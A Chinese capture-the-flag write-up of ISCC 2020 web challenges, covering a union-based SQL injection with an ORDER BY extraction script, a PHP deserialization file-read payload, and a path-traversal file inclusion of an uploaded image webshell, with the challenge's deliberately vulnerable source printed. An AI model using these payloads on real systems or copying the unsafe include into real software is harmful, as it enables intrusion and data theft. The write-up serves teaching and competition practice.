> 原文链接: https://www.anquanke.com//post/id/206658 


# ISCC 2020 Web WriteUp


                                阅读量   
                                **252657**
                            
                        |
                        
                                                            评论
                                <b>
                                    <a target="_blank">5</a>
                                </b>
                                                                                                                                    ![](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC)
                                                                                            



[![](https://p4.ssl.qhimg.com/t010bbbae28e5192399.jpg)](https://p4.ssl.qhimg.com/t010bbbae28e5192399.jpg)

## 前言

记录一下ISCC2020历经25天的Web题解，题量可能有点多 QAQ ！！针对题目的难易程度上：易、中、难都有（老少皆宜），此次比赛和以往不太一样，增加了擂台题和实战题一定程度上还是不错的。

## 练武题-Web

### <a class="reference-link" name="%E9%98%BF%E6%A3%AE%E7%9A%84%E7%88%B1%E6%83%85-1"></a>阿森的爱情-1

[![](https://p3.ssl.qhimg.com/t01cb5dab87919ad7f2.png)](https://p3.ssl.qhimg.com/t01cb5dab87919ad7f2.png)

考点：敏感信息收集

使用工具对网站进行敏感信息的探测，存在`readme.txt`

[![](https://p4.ssl.qhimg.com/t014705842def9912d2.png)](https://p4.ssl.qhimg.com/t014705842def9912d2.png)

访问`readme.txt`直接得到flag

[![](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC)](https://p4.ssl.qhimg.com/t012367937a41658264.png)

```
flag`{`uragoodman`}`
```

### <a class="reference-link" name="%E9%98%BF%E6%A3%AE%E7%9A%84%E7%88%B1%E6%83%85-2"></a>阿森的爱情-2

[![](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC)](https://p2.ssl.qhimg.com/t01bd56c4b96ae5e33d.png)

考点：SQL注入

题目打开是一个登录界面，测试是否存在注入，发现有waf拦截

[![](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC)](https://p4.ssl.qhimg.com/t01ed67f041223a8ace.png)

碰到这样直接fuzz探测存在哪些字符被拦截，只有知道哪些字符被拦截了才能够进行下一步的注入绕过，这里使用bp进行fuzz

[![](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC)](https://p3.ssl.qhimg.com/t01221b8ecba2d76204.png)

紧接着测试发现存在布尔盲注

```
username=admin' and 2&gt;1#&amp;password=11&amp;submit=enter
```

[![](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC)](https://p2.ssl.qhimg.com/t01d0f009b69d6c2a7e.png)

虽然存在布尔盲注，但是由于网站waf对一些特殊字符的拦截导致布尔盲注无法利用，同时在测试时间盲注和报错盲注的时候也是因为waf的拦截导致无法利用。

既然因为waf的拦截导致无法利用，那就分析waf拦截的字符，发现对`select、order by、union`等字符没有被过滤，所以这里可以尝试使用针对`order by`的联合查询注入读取敏感信息。

探测当前数据库表存在的列数（根据回显信息得出当前表为3列，可以猜测三列分别为：id、username、password）

[![](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC)](https://p4.ssl.qhimg.com/t01d318dfe053d635e7.png)

知道列数之后开始进行联合查询，测试发现存在联合查询注入，同时页面回显的内容正是第二列用户名的内容

[![](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC)](https://p0.ssl.qhimg.com/t015b57621482f97af7.png)

根据之前的提示，flag存在于第三列密码字段列中：`The content in the password column is the flag!`，但是因为页面回显的是第二列内容无法回显第三列内容，所以这里无法直接利用上述payload，到这里是否真的无法判断第三列内容呢，答案是否定的，这里可以巧妙的使用`order by`以及结合页面的回显来判断第三列所存储的密码，下面编写测试数据表进行测试分析

测试数据:

```
+----+----------+----------------------------------+
| id | username | password                         |
+----+----------+----------------------------------+
|  1 | admin    | bfe42ac26e273ef3a859a651e0a02df0 |
+----+----------+----------------------------------+
```

注入分析:

由于网站联合注入显示的是第二列内容，那么我们就可以通过使用`order by`操作第三列同时改变联合查询第三列的值，来判断网站数据库表中第三列的的存储的真实密码

payload

```
select * from test.test0 union select 1,2,'c' order by 3,2;
```

`order by 3,2`表示先以第三列排序，如果遇到第三列内容完全相同则再使用第二列进行相同行的排序

由于使用第三列进行排序，所以当联合查询中第三列的字符如果小于等于真实的第三列密码字符则会页面会显示字符`2`，否则显示`admin`，下面通过测试用例来查看

```
mysql&gt; select * from test.test0 union select 1,2,'a' order by 3,2; 
+----+----------+----------------------------------+
| id | username | password                         |
+----+----------+----------------------------------+
|  1 | 2        | a                                |
|  1 | admin    | bfe42ac26e273ef3a859a651e0a02df0 |
+----+----------+----------------------------------+
2 rows in set (0.00 sec)

mysql&gt; select * from test.test0 union select 1,2,'b' order by 3,2; 
+----+----------+----------------------------------+ 
| id | username | password                         |
+----+----------+----------------------------------+
|  1 | 2        | b                                |
|  1 | admin    | bfe42ac26e273ef3a859a651e0a02df0 |
+----+----------+----------------------------------+
2 rows in set (0.00 sec)

mysql&gt; select * from test.test0 union select 1,2,'c' order by 3,2; 
+----+----------+----------------------------------+
| id | username | password                         |
+----+----------+----------------------------------+
|  1 | admin    | bfe42ac26e273ef3a859a651e0a02df0 |
|  1 | 2        | c                                | 
+----+----------+----------------------------------+ 
2 rows in set (0.00 sec)
```

从结果可以验证，通过对第三列进行排序确实可以判断第三列所存储的密码，其真实密码等于页面显示`admin`判定出来的每一个字符减一，下面对中间字符判断测试

```
mysql&gt; select * from test.test0 union select 1,2,'bfe42ac26e26' order by 3,2;
+----+----------+----------------------------------+                         
| id | username | password                         |                         
+----+----------+----------------------------------+                         
|  1 | 2        | bfe42ac26e26                     |                         
|  1 | admin    | bfe42ac26e273ef3a859a651e0a02df0 |                         
+----+----------+----------------------------------+                         
2 rows in set (0.00 sec)                                                     

mysql&gt; select * from test.test0 union select 1,2,'bfe42ac26e27' order by 3,2;
+----+----------+----------------------------------+
| id | username | password                         |
+----+----------+----------------------------------+
|  1 | 2        | bfe42ac26e27                     |
|  1 | admin    | bfe42ac26e273ef3a859a651e0a02df0 |
+----+----------+----------------------------------+
2 rows in set (0.00 sec)

mysql&gt; select * from test.test0 union select 1,2,'bfe42ac26e28' order by 3,2;
+----+----------+----------------------------------+
| id | username | password                         |
+----+----------+----------------------------------+
|  1 | admin    | bfe42ac26e273ef3a859a651e0a02df0 |
|  1 | 2        | bfe42ac26e28                     |
+----+----------+----------------------------------+
2 rows in set (0.00 sec)
```

最后对末尾字符进行判断

```
mysql&gt; select * from test.test0 union select 1,2,'bfe42ac26e273ef3a859a651e0a02df0' order by 3,2;
+----+----------+----------------------------------+
| id | username | password                         |
+----+----------+----------------------------------+
|  1 | 2        | bfe42ac26e273ef3a859a651e0a02df0 |
|  1 | admin    | bfe42ac26e273ef3a859a651e0a02df0 |
+----+----------+----------------------------------+
2 rows in set (0.00 sec)

mysql&gt; select * from test.test0 union select 1,2,'bfe42ac26e273ef3a859a651e0a02df1' order by 3,2;
+----+----------+----------------------------------+
| id | username | password                         |
+----+----------+----------------------------------+
|  1 | admin    | bfe42ac26e273ef3a859a651e0a02df0 |
|  1 | 2        | bfe42ac26e273ef3a859a651e0a02df1 |
+----+----------+----------------------------------+
2 rows in set (0.00 sec)
```

在判断末尾最后一个字符的时候`order by 3,2`中第二列判断就该起作用了

通过上述本地模拟数据的测试，现在编写脚本来对该网站进行注入读取敏感数据

```
import requests
url='http://101.201.126.95:7006'
string='0123456789abcdefghijkmnlopqrstuvwxyz' #密码字段，大小写字母无所谓
flag=''
for i in range(300):
    for a in string:
        payload="admin' union select 1,'2','"+flag+str(a)+"' order by 3,2#"
        data=`{`"username":payload, "password":1, "submit":"enter"`}`
        result=requests.post(url=url,data=data).text
        if 'admin' in result:
            flag+=string[string.index(a)-1]
            print(flag)
            break
```

注入结果

[![](https://p1.ssl.qhimg.com/t01e73d9e60a233c3f7.png)](https://p1.ssl.qhimg.com/t01e73d9e60a233c3f7.png)

解密密码得到flag

```
ciphertext：bfe42ac26e273ef3a859a651e0a02df0

plaintext：iloveishuai

flag`{`iloveishuai`}`
```

### <a class="reference-link" name="Php%20is%20the%20best%20language"></a>Php is the best language

[![](https://p1.ssl.qhimg.com/t012f82d51382b0e9ed.png)](https://p1.ssl.qhimg.com/t012f82d51382b0e9ed.png)

考点：反序列化`__toString`的利用

[![](https://p2.ssl.qhimg.com/t01e3a927d36caf7269.png)](https://p2.ssl.qhimg.com/t01e3a927d36caf7269.png)

根据提示下载文件

```
&lt;?php  
@error_reporting(1);
include 'flag.php';
class baby 
`{`
    public $file;
    function __toString()      
    `{`
        if(isset($this-&gt;file))
        `{`
            $filename = "./`{`$this-&gt;file`}`";
            if (base64_encode(file_get_contents($filename)))
            `{`
                return base64_encode(file_get_contents($filename));
            `}`
        `}`
    `}`
`}`
if (isset($_GET['data']))
`{`
    $data = $_GET['data'];
        $good = unserialize($data);
        echo $good;
`}`
else 
`{`
    $url='./index.php';
`}`

$html='';
if(isset($_POST['test']))`{`
    $s = $_POST['test'];
    $html.="&lt;p&gt;谢谢参与!&lt;/p&gt;";
`}`
?&gt;
```

对下载下来的源码进行代码审计，发现存在反序列化参数可控，并且可以正常触发反序列数据，根据序列化代码部分，构造恶意的序列化payload

```
&lt;?php
class baby 
`{`
    public $file;
    function __toString()      
    `{`
        if(isset($this-&gt;file))
        `{`
            $filename = "./`{`$this-&gt;file`}`";
            if (base64_encode(file_get_contents($filename)))
            `{`
                return base64_encode(file_get_contents($filename));
            `}`
        `}`
    `}`
`}`

$flag = new baby();
$flag-&gt;file = 'flag.php';
echo serialize($flag);
?&gt;
```

[![](https://p2.ssl.qhimg.com/t012ed56d6107356e32.png)](https://p2.ssl.qhimg.com/t012ed56d6107356e32.png)

继续审计，使用攻击载荷，对Get请求data传参，传入序列化数据，当反序列化数据被当作字符串处理时`echo`，会触发`__toString`反序列化载荷，然后由`file_get_contents($filename)`执行读取文件的操作

[![](https://p4.ssl.qhimg.com/t01d424d8c783f1048b.png)](https://p4.ssl.qhimg.com/t01d424d8c783f1048b.png)

base64解码得到特殊文件内容

[![](https://p1.ssl.qhimg.com/t01c731ed14d972db3f.png)](https://p1.ssl.qhimg.com/t01c731ed14d972db3f.png)

```
flag`{`u_r_really_a_php_expert`}`
```

### <a class="reference-link" name="What%20can%20images%20do"></a>What can images do

[![](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC)](https://p1.ssl.qhimg.com/t01e3c5dfa1762665be.png)

考点：文件包含Bypass前缀限制、敏感信息泄露

题目面目

[![](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC)](https://p0.ssl.qhimg.com/t01298845fa033061c0.png)

测试上传文件，发现只能上传`jpg,jpeg,png`格式

[![](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC)](https://p4.ssl.qhimg.com/t013621c0f89cf9ee23.png)

继续往下看，测试下一个功能发现存在文件包含

[![](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC)](https://p1.ssl.qhimg.com/t01a43b73ecc04e6a02.png)

```
?filename=../../../../etc/passwd
```

[![](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC)](https://p4.ssl.qhimg.com/t01ec509499c16fd3c4.png)

然而并不能使用PHP伪协议，存在包含限制，于是对网站扫描敏感信息得到网站关键路径

[![](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC)](https://p0.ssl.qhimg.com/t01ad44d6b650f10071.png)

`/inc/`目录存放网站上传功能的脚本

[![](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC)](https://p4.ssl.qhimg.com/t01ee1fc582f26104ed.png)

`include`目录存放网站包含所需的文件

[![](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC)](https://p0.ssl.qhimg.com/t016caca1772e1fd85a.png)

`uploads`目录存放网站上传的文件

[![](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC)](https://p3.ssl.qhimg.com/t019145fc46984448be.png)

根据`include`目录文件信息可以猜测包含功能函数限制在`include`目录里面，类似代码如下：

```
include(include/$filename);
```

这时候再看网站本身文件的包含，确实是直接限制在include目录里面

`?filename=file5.php&amp;submit=提交查询`

[![](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC)](https://p1.ssl.qhimg.com/t01a43b73ecc04e6a02.png)

这个时候已经很清楚了，由于没有对`../`进行过滤，直接上传图片马，路径穿透包含图片马Getshell

[![](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC)](https://p3.ssl.qhimg.com/t01e93dc4817eb2a703.png)

```
http://101.201.126.95:7004/?filename=../uploads/2020/05/01/2418455eabbf3f5765a454339781.jpg&amp;submit=%25E6%258F%2590%25E4%25BA%25A4%25E6%259F%25A5%25E8%25AF%25A2
```

[![](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC)](https://p3.ssl.qhimg.com/t01c2c38fa2a391fb4c.png)

```
cat flag.php

flag`{`ISCC_FREAKING_AWESOME`}`
```

**附题目源码**
- index.php
```
&lt;?php
$SELF_PAGE = substr($_SERVER['PHP_SELF'],strrpos($_SERVER['PHP_SELF'],'/')+1);

if ($SELF_PAGE = "clientcheck.php")`{`
    $ACTIVE = array('','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','active open','','','','active','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','');
`}`

include_once 'inc/uploadfunction.php';

$html='';
if(isset($_POST['submit']))`{`
    $type=array('jpg','jpeg','png');//指定类型
    $mime=array('image/jpg','image/jpeg','image/png');
    $save_path='uploads'.date('/Y/m/d/');//根据当天日期生成一个文件夹
    $upload=upload('uploadfile','512000',$type,$mime,$save_path);//调用函数
    if($upload['return'])`{`
        $html.="&lt;p class='notice'&gt;success！&lt;/p&gt;&lt;p class='notice'&gt;文件保存的路径为：`{`$upload['save_path']`}`&lt;/p&gt;";
    `}`else`{`
        $html.="&lt;p class=notice&gt;`{`$upload['error']`}`&lt;/p&gt;";

    `}`
`}`
?&gt;

&lt;head&gt;
    &lt;title&gt;ISCC | What can images do?&lt;/title&gt;
    &lt;style&gt;
    body`{`background-image:url(./static/background.jpg);`}`

    html,body`{`
    position: relative;
    height: 100%;
    `}`

    .main-content`{`
    position: relative;
    width: 300px;
    margin: 80px auto;
    padding: 20px 40px 40px;
    text-align: center;
    background: #fff;
    border: 1px solid #ccc;
    `}`

    .main-content::before,.main-content::after`{`
    content: "";
    position: absolute;
    width: 100%;height: 100%;
    top: 3.5px;left: 0;
    background: #fff;
    z-index: -1;
    -webkit-transform: rotateZ(4deg);
    -moz-transform: rotateZ(4deg);
    -ms-transform: rotateZ(4deg);
    border: 1px solid #ccc;
    `}`

    .main-content::after`{`
    top: 5px;
    z-index: -2;
    -webkit-transform: rotateZ(-2deg);
     -moz-transform: rotateZ(-2deg);
      -ms-transform: rotateZ(-2deg);
    `}`

    .main-content1`{`
    position: relative;
    width: 300px;
    margin: 80px auto;
    padding: 20px 40px 40px;
    text-align: center;
    background: #fff;
    border: 1px solid #ccc;
    `}`

    .main-content1::before,.main-content::after`{`
    content: "";
    position: absolute;
    width: 100%;height: 100%;
    top: 3.5px;left: 0;
    background: #fff;
    z-index: -1;
    -webkit-transform: rotateZ(4deg);
    -moz-transform: rotateZ(4deg);
    -ms-transform: rotateZ(4deg);
    border: 1px solid #ccc;
    `}`

    .main-content1::after`{`
    top: 5px;
    z-index: -2;
    -webkit-transform: rotateZ(-2deg);
     -moz-transform: rotateZ(-2deg);
      -ms-transform: rotateZ(-2deg);
    `}`
    &lt;/style&gt;
&lt;/head&gt;
&lt;body&gt;
&lt;div class="main-content"&gt;
    &lt;div class="main-content-inner"&gt;
        &lt;div class="page-content"&gt;
            &lt;div id="usu_main"&gt;
                &lt;form class="upload" method="post" enctype="multipart/form-data"  action=""&gt;&lt;br/&gt;
                    &lt;input class="uploadfile" type="file"  name="uploadfile" /&gt;&lt;br/&gt;
                    &lt;input class="sub" type="submit" name="submit" value="点击上传" /&gt;
                &lt;/form&gt;
                &lt;?php
                echo $html;//输出了上传文件的路径
                ?&gt;
            &lt;/div&gt;
        &lt;/div&gt;&lt;!-- /.page-content --&gt;
    &lt;/div&gt;
&lt;/div&gt;&lt;!-- /.main-content --&gt;

&lt;?php

$SELF_PAGE = substr($_SERVER['PHP_SELF'],strrpos($_SERVER['PHP_SELF'],'/')+1);

if ($SELF_PAGE = "fi_local.php")`{`
    $ACTIVE = array('','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','active open','',
        'active','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','');
`}`

$html='';
if(isset($_GET['submit']) &amp;&amp; $_GET['filename']!=null)`{`
    $filename=$_GET['filename'];
    include "include/$filename";//变量传进来直接包含,没做任何的安全限制
//     安全的写法,使用白名单，严格指定包含的文件名
//     if($filename=='file1.php' || $filename=='file2.php' || $filename=='file3.php' || $filename=='file4.php' || $filename=='file5.php')`{`
//         include "include/$filename";
//     `}`
`}`

?&gt;


&lt;div class="main-content1"&gt;
    &lt;div class="main-content-inner1"&gt;
        &lt;div class="page-content1"&gt;
            &lt;div id=fi_main&gt;
                &lt;p class="fi_title"&gt;PS:这里可以看到一些好看的图片示例哦~&lt;/p&gt;
                &lt;form method="get"&gt;
                    &lt;select name="filename"&gt;
                        &lt;option value=""&gt;--------------&lt;/option&gt;
                        &lt;option value="file1.php"&gt;the Eiffel Tower&lt;/option&gt;
                        &lt;option value="file2.php"&gt;the Great Wall&lt;/option&gt;
                        &lt;option value="file3.php"&gt;Big Ben&lt;/option&gt;
                        &lt;option value="file4.php"&gt;Statue Of Liberty&lt;/option&gt;
                        &lt;option value="file5.php"&gt;Taj Mahal&lt;/option&gt;
                    &lt;/select&gt;
                    &lt;input class="sub" type="submit" name="submit" /&gt;
                &lt;/form&gt;
                &lt;?php echo $html;?&gt;
            &lt;/div&gt;
        &lt;/div&gt;&lt;!-- /.page-content1 --&gt;
    &lt;/div&gt;
&lt;/div&gt;&lt;!-- /.main-content1 --&gt;

&lt;/body&gt;

```
- uploadfunction.php
```
&lt;?php
//客户端前端验证的后台函数
function upload_client($key,$save_path)`{`
    $arr_errors=array(
        1=&gt;'上传的文件超过了 php.ini中 upload_max_filesize 选项限制的值',
        2=&gt;'上传文件的大小超过了 HTML 表单中 MAX_FILE_SIZE 选项指定的值',
        3=&gt;'文件只有部分被上传',
        4=&gt;'没有文件被上传',
        6=&gt;'找不到临时文件夹',
        7=&gt;'文件写入失败'
    );
    if(!isset($_FILES[$key]['error']))`{`
        $return_data['error']='请选择上传文件！';
        $return_data['return']=false;
        return $return_data;
    `}`
    if ($_FILES[$key]['error']!=0) `{`
        $return_data['error']=$arr_errors[$_FILES[$key]['error']];
        $return_data['return']=false;
        return $return_data;
    `}`
    //新建一个保存文件的目录
    if(!file_exists($save_path))`{`
        if(!mkdir($save_path,0777,true))`{`
            $return_data['error']='上传文件保存目录创建失败，请检查权限!';
            $return_data['return']=false;
            return $return_data;
        `}`
    `}`
    $save_path=rtrim($save_path,'/').'/';//给路径加个斜杠
    if(!move_uploaded_file($_FILES[$key]['tmp_name'],$save_path.$_FILES[$key]['name']))`{`
        $return_data['error']='临时文件移动失败，请检查权限!';
        $return_data['return']=false;
        return $return_data;
    `}`
    //如果以上都通过了，则返回这些值，存储的路径，新的文件名（不要暴露出去）
    $return_data['new_path']=$save_path.$_FILES[$key]['name'];
    $return_data['return']=true;
    return $return_data;

`}`

//只通过MIME类型验证了一下图片类型，其他的无验证,upsafe_upload_check.php
function upload_sick($key,$mime,$save_path)`{`
    $arr_errors=array(
        1=&gt;'上传的文件超过了 php.ini中 upload_max_filesize 选项限制的值',
        2=&gt;'上传文件的大小超过了 HTML 表单中 MAX_FILE_SIZE 选项指定的值',
        3=&gt;'文件只有部分被上传',
        4=&gt;'没有文件被上传',
        6=&gt;'找不到临时文件夹',
        7=&gt;'文件写入失败'
    );
    if(!isset($_FILES[$key]['error']))`{`
        $return_data['error']='请选择上传文件！';
        $return_data['return']=false;
        return $return_data;
    `}`
    if ($_FILES[$key]['error']!=0) `{`
        $return_data['error']=$arr_errors[$_FILES[$key]['error']];
        $return_data['return']=false;
        return $return_data;
    `}`
    //验证一下MIME类型
    if(!in_array($_FILES[$key]['type'], $mime))`{`
        $return_data['error']='上传的图片只能是jpg,jpeg,png格式的！';
        $return_data['return']=false;
        return $return_data;
    `}`
    //新建一个保存文件的目录
    if(!file_exists($save_path))`{`
        if(!mkdir($save_path,0777,true))`{`
            $return_data['error']='上传文件保存目录创建失败，请检查权限!';
            $return_data['return']=false;
            return $return_data;
        `}`
    `}`
    $save_path=rtrim($save_path,'/').'/';//给路径加个斜杠
    if(!move_uploaded_file($_FILES[$key]['tmp_name'],$save_path.$_FILES[$key]['name']))`{`
        $return_data['error']='临时文件移动失败，请检查权限!';
        $return_data['return']=false;
        return $return_data;
    `}`
    //如果以上都通过了，则返回这些值，存储的路径，新的文件名（不要暴露出去）
    $return_data['new_path']=$save_path.$_FILES[$key]['name'];
    $return_data['return']=true;
    return $return_data;

`}`

//进行了严格的验证
function upload($key,$size,$type=array(),$mime=array(),$save_path)`{`
    $arr_errors=array(
        1=&gt;'上传的文件超过了 php.ini中 upload_max_filesize 选项限制的值',
        2=&gt;'上传文件的大小超过了 HTML 表单中 MAX_FILE_SIZE 选项指定的值',
        3=&gt;'文件只有部分被上传',
        4=&gt;'没有文件被上传',
        6=&gt;'找不到临时文件夹',
        7=&gt;'文件写入失败'
    );
//     var_dump($_FILES);
    if(!isset($_FILES[$key]['error']))`{`
        $return_data['error']='请选择上传文件！';
        $return_data['return']=false;
        return $return_data;
    `}`
    if ($_FILES[$key]['error']!=0) `{`
        $return_data['error']=$arr_errors[$_FILES[$key]['error']];
        $return_data['return']=false;
        return $return_data;
    `}`
    //验证上传方式
    if(!is_uploaded_file($_FILES[$key]['tmp_name']))`{`
        $return_data['error']='您上传的文件不是通过 HTTP POST方式上传的！';
        $return_data['return']=false;
        return $return_data;
    `}`
    //获取后缀名，如果不存在后缀名，则将变量设置为空
    $arr_filename=pathinfo($_FILES[$key]['name']);
    if(!isset($arr_filename['extension']))`{`
        $arr_filename['extension']='';
    `}`
    //先验证后缀名
    if(!in_array(strtolower($arr_filename['extension']),$type))`{`//转换成小写，在比较
        $return_data['error']='你传的好像不是图片哦~(后缀名不是'.implode(',',$type).'中的一个)';
        $return_data['return']=false;
        return $return_data;
    `}`

    //验证MIME类型，MIME类型可以被绕过
    if(!in_array($_FILES[$key]['type'], $mime))`{`
        $return_data['error']='你上传的是个假图片，不要欺骗我xxx！';
        $return_data['return']=false;
        return $return_data;
    `}`
    //通过getimagesize来读取图片的属性，从而判断是不是真实的图片，还是可以被绕过的
    if(!getimagesize($_FILES[$key]['tmp_name']))`{`
        $return_data['error']='你上传的是个假图片，不要欺骗我！';
        $return_data['return']=false;
        return $return_data;
    `}`
    //验证大小
    if($_FILES[$key]['size']&gt;$size)`{`
        $return_data['error']='上传文件的大小不能超过'.$size.'byte(500kb)';
        $return_data['return']=false;
        return $return_data;
    `}`

    //把上传的文件给他搞一个新的路径存起来
    if(!file_exists($save_path))`{`
        if(!mkdir($save_path,0777,true))`{`
            $return_data['error']='上传文件保存目录创建失败，请检查权限!';
            $return_data['return']=false;
            return $return_data;
        `}`
    `}`
    //生成一个新的文件名，并将新的文件名和之前获取的扩展名合起来，形成文件名称
    $new_filename=str_replace('.','',uniqid(mt_rand(100000,999999),true));
    if($arr_filename['extension']!='')`{`
        $arr_filename['extension']=strtolower($arr_filename['extension']);//小写保存
        $new_filename.=".`{`$arr_filename['extension']`}`";
    `}`
    //将tmp目录里面的文件拷贝到指定目录下并使用新的名称
    $save_path=rtrim($save_path,'/').'/';
    if(!move_uploaded_file($_FILES[$key]['tmp_name'],$save_path.$new_filename))`{`
        $return_data['error']='临时文件移动失败，请检查权限!';
        $return_data['return']=false;
        return $return_data;
    `}`
    //如果以上都通过了，则返回这些值，存储的路径，新的文件名（不要暴露出去）
    $return_data['save_path']=$save_path.$new_filename;
    $return_data['filename']=$new_filename;
    $return_data['return']=true;
    return $return_data;
    `}`


?&gt;
```

### <a class="reference-link" name="%E6%9C%AA%E7%9F%A5%E7%9A%84%E9%A3%8E%E9%99%A9-1"></a>未知的风险-1

